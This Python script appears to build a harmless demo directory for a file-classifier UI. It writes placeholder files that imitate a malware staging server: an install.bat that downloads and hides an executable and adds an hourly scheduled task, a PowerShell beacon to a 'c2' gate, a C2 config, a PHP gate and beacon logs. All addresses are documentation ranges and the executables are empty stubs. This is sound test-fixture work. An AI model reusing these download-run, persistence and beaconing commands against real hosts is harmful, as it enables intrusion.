"""Builds a harmless fake open directory so the UI has real data to render.

Everything here is text. The addresses are the documentation ranges reserved by
RFC 5737 and RFC 2606, so nothing in this tree points at a real host. The only
binary-looking parts are magic bytes, which is what the classifier reads.
"""

from pathlib import Path
from shutil import rmtree

NL = chr(10)
ROOT = Path(r"C:\Users\ALP\AppData\Local\Temp\dirsift-demo-target")

MZ = bytes([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00])
PNG = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
ZIP = bytes([0x50, 0x4B, 0x03, 0x04])
PDF = bytes([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37])


def text(path: Path, lines: list[str]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(NL.join(lines).encode("utf-8") + NL.encode("utf-8"))


def binary(path: Path, magic: bytes, size: int) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(magic + bytes(size - len(magic)))


if ROOT.exists():
    rmtree(ROOT)
ROOT.mkdir(parents=True)

text(
    ROOT / "install.bat",
    [
        "@echo off",
        "rem staged install, keep the window closed",
        "set DEST=%APPDATA%" + chr(92) + "svchost",
        "mkdir %DEST%",
        "curl -s -o %DEST%" + chr(92) + "svc4.exe http://203.0.113.24/bin/svc4.exe",
        "curl -s -o %DEST%" + chr(92) + "cfg.json http://203.0.113.24/config.json",
        "start /b %DEST%" + chr(92) + "svc4.exe -q",
        "schtasks /create /tn Updater /tr %DEST%" + chr(92) + "svc4.exe /sc hourly",
    ],
)

text(
    ROOT / "update.ps1",
    [
        "$ErrorActionPreference = 'SilentlyContinue'",
        "$c2 = 'http://198.51.100.77:8443/gate.php'",
        "$panel = 'panel.example.net'",
        "Invoke-WebRequest -Uri $c2 -Method POST -Body $env:COMPUTERNAME",
        "Start-Process bin/loader_2024-02-02.exe",
    ],
)

text(
    ROOT / "config.json",
    [
        "{",
        '  "c2": ["203.0.113.24", "198.51.100.77:8443"],',
        '  "fallback": "http://cdn.example.org/beacon",',
        '  "telegram": "123456789:AAFakeTokenForTestingOnly0000000000",',
        '  "aws_key": "AKIAIOSFODNN7EXAMPLE",',
        '  "mutex": "Global' + chr(92) + chr(92) + 'svchost-2024",',
        '  "interval": 900',
        "}",
    ],
)

text(
    ROOT / "readme.txt",
    [
        "build notes",
        "",
        "panel is at hxxp://panel[.]example[.]net/admin",
        "backup gate 198[.]51[.]100[.]77",
        "operator contact: ops@example.net",
    ],
)

for number in (1, 2, 3, 4):
    binary(ROOT / "bin" / ("svc" + str(number) + ".exe"), MZ, 4096 + number * 32)
binary(ROOT / "bin" / "loader_2024-01-15.exe", MZ, 8192)
binary(ROOT / "bin" / "loader_2024-02-02.exe", MZ, 8320)

text(
    ROOT / "panel" / "gate.php",
    [
        "<?php",
        "$db = 'mysql://panel:hunter2@127.0.0.1/gate';",
        "$drop = 'http://203.0.113.24/bin/svc4.exe';",
        "if (isset($_POST['id'])) { file_put_contents('logs/beacons.log', $_POST['id']); }",
        "?>",
    ],
)

text(
    ROOT / "panel" / "index.php",
    [
        "<?php require 'gate.php'; ?>",
        "<h1>panel</h1>",
    ],
)

text(
    ROOT / "logs" / "beacons.log",
    [
        "2026-09-14 21:03:11 198.51.100.4 WIN-DESKTOP-A ok",
        "2026-09-14 21:07:42 198.51.100.9 WIN-LAPTOP-B ok",
        "2026-09-15 02:11:09 203.0.113.190 SRV-FILE01 ok",
    ],
)

text(
    ROOT / "data" / "targets.csv",
    [
        "host,user,seen",
        "SRV-FILE01,admin,2026-09-15",
        "WIN-LAPTOP-B,alp,2026-09-14",
    ],
)

binary(ROOT / "img" / "logo.png", PNG, 2048)
binary(ROOT / "archive.zip", ZIP, 16384)
binary(ROOT / "manual.pdf", PDF, 4096)

# The interesting row in any listing: a PDF that starts with MZ.
binary(ROOT / "invoice.pdf", MZ, 3072)

print("demo target built at", ROOT)
for path in sorted(ROOT.rglob("*")):
    if path.is_file():
        print(" ", path.relative_to(ROOT).as_posix(), path.stat().st_size)
